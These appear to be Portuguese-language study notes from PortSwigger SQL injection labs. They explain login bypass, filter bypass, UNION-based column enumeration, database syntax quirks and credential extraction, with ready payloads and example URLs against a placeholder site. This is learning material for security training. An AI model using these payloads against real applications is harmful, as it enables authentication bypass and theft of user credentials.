# Anotações: SQL Injection (PortSwigger)

## 1. Subverter a Lógica de Login

- **Objetivo:** Burlar a autenticação sem saber a senha.
- **Payload no Usuário:** `administrator'--`
- **Senha:** Pode ser deixada em branco ou com qualquer valor.
- **Por que funciona?** O caractere `--` transforma a verificação de senha em um comentário SQL, ignorando a instrução `AND password = '...'`.

---

## 2. Exibir Dados Ocultos (Bypassing Filters)

- **Burlar filtros:** `Gifts'--` (remove travas como `AND released = 1`).
- **Retornar tudo:** `' OR 1=1--` (torna a busca sempre verdadeira, trazendo o catálogo completo).

---

## 3. SQLi Baseado em UNION (UNION Attacks)

Usado para extrair dados de outras tabelas quando a aplicação exibe os resultados da busca na tela.

### Requisitos Obrigatórios:

1. **Mesmo número de colunas:** A consulta injetada deve ter exatamente a mesma quantidade de colunas da consulta original.
   - _Original (2 colunas):_ `SELECT nome, preco FROM produtos`
   - _Injeção (2 colunas):_ `UNION SELECT username, password FROM users`
2. **Tipos de dados compatíveis:** Se a Coluna 1 da busca espera Texto, a Coluna 1 da injeção DEVE ser Texto.

---

## 4. Técnicas de Enumeração (Descobrir colunas na prática)

- **Usando ORDER BY:** `' ORDER BY 1--`, `' ORDER BY 2--` (Testa até dar erro de servidor).
- **Usando NULL:** `' UNION SELECT NULL, NULL--` (Testa quantidade de colunas com valor neutro até obter HTTP 200 OK).

### Método ORDER BY (Descobrir número de colunas)

- **Como funciona:** O `ORDER BY X` pede para o banco ordenar o resultado pela coluna número X.
- **Técnica:** Incrementamos o número de 1 em 1 até o site dar erro ou mudar o comportamento.
- **Regra do limite:** Se o erro aconteceu no número **3**, significa que a tabela original tem exatamente **2 colunas**.

### Método UNION SELECT NULL (Descobrir número de colunas)

- **Como funciona:** Injetamos consultas contendo apenas `NULL` separados por vírgula.
- **Por que usar NULL?** O `NULL` representa um valor vazio e é compatível com qualquer tipo de dado (texto, número, data), evitando erros de tipo.
- **Técnica:** Aumentamos a quantidade de `NULL` até a resposta da aplicação mudar de Erro/Falha para **Sucesso (HTTP 200 OK)**.
- **Regra:** Se a requisição `' UNION SELECT NULL, NULL, NULL--` retornar a página normal, a tabela possui **3 colunas**.

## Sintaxe Específica por Banco de Dados (Database Quirks)

### Oracle:

- Todo `SELECT` exige a cláusula `FROM`.
- Para injeções/testes, usa-se a tabela nativa `DUAL`.
- **Payload:** `' UNION SELECT NULL, NULL FROM DUAL--`

### MySQL:

- O comentário `--` **obrigatoriamente exige um espaço** no final (`-- `).
- Também aceita o caractere `#` para comentar.
- **Payload:** `' UNION SELECT NULL, NULL-- ` ou `' UNION SELECT NULL, NULL#`

## Testando Colunas para Dados de Texto (String Probing)

- **Objetivo:** Descobrir quais colunas aceitam texto para poder extrair dados como senhas e nomes de usuário sem quebrar o banco.
- **Técnica:** Substituímos um `NULL` por vez por uma string `'a'` até identificar quais posições não causam erro.

### Exemplo (Tabela de 4 colunas):

1. `' UNION SELECT 'a', NULL, NULL, NULL--` -> Testa Coluna 1
2. `' UNION SELECT NULL, 'a', NULL, NULL--` -> Testa Coluna 2
3. `' UNION SELECT NULL, NULL, 'a', NULL--` -> Testa Coluna 3
4. `' UNION SELECT NULL, NULL, NULL, 'a'--` -> Testa Coluna 4

> **Regra:** A posição em que a letra `'a'` for impressa na tela sem dar erro de servidor é a posição exata onde você deve injetar as variáveis de extração de dados (ex: `username`, `password`).

## 5. Extração de Dados Sensíveis (Data Exfiltration)

Após validar a quantidade de colunas e os tipos compatíveis, substituímos os valores de teste pelos nomes reais das colunas e da tabela.

### Requisitos para o Payload Funcionar:

1. Saber a quantidade exata de colunas.
2. Saber quais colunas aceitam `string`/texto.
3. Conhecer os nomes exatos da tabela e das colunas no banco.

### Exemplo do Payload Final (Tabela de 2 colunas de texto):

`' UNION SELECT username, password FROM users--`

### Fluxo do Ataque SQLi UNION Completo:

1. **Mapear número de colunas:** `' UNION SELECT NULL, NULL--` (Até dar HTTP 200).
2. **Mapear tipos de dados:** `' UNION SELECT 'a', NULL--` (Descobrir onde aceita texto).
3. **Extrair credenciais:** `' UNION SELECT username, password FROM users--`

## 6. Concatenação de Dados (Vários valores em 1 única coluna)

Usado quando a aplicação possui **apenas 1 coluna útil de texto**, mas precisamos extrair 2 ou mais dados (ex: `username` + `password`).

### Como funciona:

Juntamos os campos em uma única linha usando um caractere separador (ex: `~` ou `:`).

### Sintaxe por Banco de Dados:

- **Oracle / PostgreSQL (`||`):**
  `' UNION SELECT username || '~' || password FROM users--`
- **MySQL (`CONCAT`):**
  `' UNION SELECT CONCAT(username, '~', password) FROM users--`
- **SQL Server (`+`):**
  `' UNION SELECT username + '~' + password FROM users--`

### Saída Esperada no HTML:

- `administrator~s3cure`
- `wiener~peter`

---

## Exemplos Práticos de URL no Navegador / Burp Suite

### 1. Burlar Filtro (Trazer tudo):

https://site-vulneravel.com/products?category=Gifts'+OR+1=1--

### 2. Mapear Quantidade de Colunas com ORDER BY:

https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+1--
https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+2--
https://site-vulneravel.com/products?category=Gifts'+ORDER+BY+3-- (Se der erro aqui, a busca usa exatamente 2 colunas)

### 3. Mapear Quantidade de Colunas com UNION NULL:

https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL-- (Retorna Erro 500)
https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL,NULL-- (Retorna HTTP 200 OK -> Confirmado: 2 colunas!)

### 4. Mapear Qual Coluna Aceita Texto (String):

_(Testando uma por uma até achar qual não dá erro e reflete o 'a' na tela)_
https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+'a',NULL-- (Testa Coluna 1)
https://site-vulneravel.com/products?category=Gifts'+UNION+SELECT+NULL,'a'-- (Testa Coluna 2)

> 💡 **Dica de Burp Suite:** Ao injetar diretamente na URL via Proxy/Repeater, lembre-se de codificar os caracteres especiais (`Ctrl + U`). O espaço vira `+` e as aspas simples viram `%27`.
